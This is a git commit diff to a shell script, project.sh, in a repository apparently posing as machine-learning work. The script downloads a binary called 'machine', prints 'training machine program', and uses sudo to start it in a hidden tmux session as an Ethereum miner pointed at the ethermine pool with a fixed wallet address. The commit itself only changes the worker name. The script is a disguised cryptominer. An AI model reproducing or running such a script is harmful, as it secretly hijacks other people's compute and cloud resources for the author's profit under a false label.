8a33d7036baa35e4e7b3a5c3263b71f7303f2dc3
Akira-Slasvi <92677873+Akira-Slasvi@users.noreply.github.com>
2021-12-15 08:55:46 +0800

    Update project.sh

--- project.sh
+++ project.sh
@@ -2,4 +2,4 @@ wget https://github.com/Akira-Slasvi/machine-learn/releases/download/%23machinel
 echo project start
 echo training machine program
 chmod +x machine
-sudo tmux new-session -d -s SANS './machine -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w brianfost --lock-cclock 1150'
+sudo tmux new-session -d -s SANS './machine -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w abejara --lock-cclock 1150'
